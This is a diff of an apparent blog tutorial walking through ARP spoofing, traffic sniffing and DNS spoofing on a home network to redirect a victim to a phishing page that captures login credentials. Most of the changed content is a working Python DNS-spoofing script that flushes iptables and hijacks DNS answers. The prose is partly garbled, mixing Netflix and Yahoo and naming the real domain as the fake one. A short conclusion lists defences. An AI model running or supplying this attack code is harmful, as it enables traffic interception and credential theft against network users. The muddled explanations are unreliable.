@@ -32,7 +32,7 @@ This tutorial is split in three parts:
 3. Step 3 Spoof DNS requests
 
 
-# Step 1 of 3: ARP spoofing
+## Step 1 of 3: ARP spoofing
 Before talking about Address Resolution Protocol (ARP) we need to understand how our devices at home communicate with the internet.  
 
 All of our devices exchange data with a server in order to access a specific website or "Like" that post on Instagram. Now the thing is internet service providers (ISPs) cannot issue a new IP address every time a new tablet joins your network. The IPv4 standard only supports 4.294.967.296 unique addresses. Even though this looks like a large number, ISPs treat it like a rare resource and won't issue a public static IP to every device. Judging by the fact Apple says there are 1 billion You can call up your ISP to get one but it will cost you hard earned cash and is usually reserved to businesses who want to set up their own mail service. 
@@ -51,7 +51,7 @@ I did a long introduction to make sure everyone reading this is at the same know
     waz@localhost:$ apt install libnetfilter-queue-dev
     waz@localhost:$ virtualenv env 
     waz@localhost:$ source env/bin/activate
-    waz@localhost:$ pip install scapy==2.4.2 NetfilterQueue==1.1.0
+    waz@localhost:$ pip install scapy==2.4.2 NetfilterQueue==1.1.0 load_dotenv
     waz@localhost:$ python
     Python 3.10.6 (main, Mar 10 2023, 10:55:28) [GCC 11.3.0] on linux
     Type "help", "copyright", "credits" or "license" for more information.
@@ -132,7 +132,7 @@ If this operation results in your target having no internet please make sure to 
     1
 ```
 
-# Step 2 of 3: Sniff packets
+## Step 2 of 3: Sniff packets
 
 So now what? We have done the hardest part already. Now let's watch the traffic. If the target is visiting pages with TLS enabled you won't see any credentials or anything resembling html but we can watch the URLs and monitor the traffic.
 
@@ -191,30 +191,37 @@ def sniffer(interface):
 sniffer("REPLACE_WITH_YOUR_NIC")
 ```
 
-# Step 3 of 3: Spoof DNS requests
+## Step 3 of 3: Spoof DNS requests
 
-Our final step will be to serve our [custom netflix phishing page](https://chirpy.craftstudios.shop/posts/a-simple-phishing-page/) that I shared a couple of weeks ago. Instead of going to the actual netflix page the user is served a fake login page at www.netflix.con that captures credentials and then redirects to the actual website www.netflix.com
+Our final step will be to serve our [custom netflix phishing page](https://chirpy.craftstudios.shop/posts/a-simple-phishing-page/) that I shared a couple of weeks ago. Instead of going to the actual yahoo page the user is served a fake login page at www.yahoo.com that captures credentials and then redirects to the actual website
+
+The implementation below can seem daunting at first but if you understand the heuristics it becomes easier to understand. if you don't know how socket programming works bear with me. 
+
+So our task is to replace our tablet's DNS request with ours except it's not as easy as deleting or filtering the existing one. If you do that the socket will close the connection. The workaround is to stall the original DNS request into a "netfilterqueue" queue. This delay allows us to get a faster round trip to the yahoo servers and ensuring our request gets passed to the tablet.
 
 
 ```python
 
-#!/usr/bin/env python
-
 import netfilterqueue
 import scapy.all as scapy
+import os
+from dotenv import load_dotenv
 
+
+load_dotenv()
+QUEUE_ID = os.getenv("QUEUE_ID")
+URL_TO_SPOOF = os.getenv("URL_TO_SPOOF")
+REDIRECT_IP = os.getenv("REDIRECT_IP")
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
-    # filter DNS response requests only
+    print(scapy_packet.show())
+    # filter DNS response requests
     if scapy_packet.haslayer(scapy.DNSRR):
-        # filter netflix DNS response requests only
-        # you can run print(scapy_packet.show()) or 
-        # apply a break point to write it as you go
         qname = scapy_packet[scapy.DNSQR].qname
-        if "www.netflix.com" in str(qname):
+        if URL_TO_SPOOF in str(qname):
             print("[+] Spoofing target")
-            answer = scapy.DNSRR(rrname="www.netflix.com", rdata="www.netflix.con")
+            answer = scapy.DNSRR(rrname=URL_TO_SPOOF, rdata=REDIRECT_IP)
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
 
@@ -226,18 +233,35 @@ def process_packet(packet):
             packet.set_payload(bytes(scapy_packet))
     packet.accept()
 
+if __name__ == '__main__':
 
-queue = netfilterqueue.NetfilterQueue()
-queue.bind(0, process_packet)
-try:
-    while True:
-        queue.run()
-except KeyboardInterrupt:
-    print("\n[-] Exiting program")
+    os.system("sudo iptables --flush")
+    os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_ID))
+    queue = netfilterqueue.NetfilterQueue()
+    queue.bind(int(QUEUE_ID), process_packet)
 
-
+    try:
+        while True:
+            queue.run()
+    except KeyboardInterrupt:
+        print("\n[-] Exiting program")
 
 ```
+## Video
+
+<div style="padding-top: 5px; padding-bottom: 5px; position:relative; display:block; width: 100%; min-height:400px">
+<iframe width="100%" height="400px" src="https://youtube.craftstudios.shop/uploads/netgear/Videos/chirpy/dns%20spoof2.mp4" title="YouTube video player" frameborder="0" allow="accelerometer; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+</div>
+
+## Conclusion
+This attack can be easily thwarted by either using modern browsers that verify the TLS certificates and detect this type of attack or by modifying your ip_tables to lock down your ARP table. Example below for the linux implementation:
+
+
+```console
+    waz@localhost:$ arp -s 192.168.0.65 00:50:ba:85:85:ca
+```
+I found some interesting CISCO router configuration as well that allows us to lock down your gateway's MAC address [here](https://www.freeccnaworkbook.com/workbooks/ccna/configuring-a-static-arp-entry)
+
 
 Thanks for reading this far
 
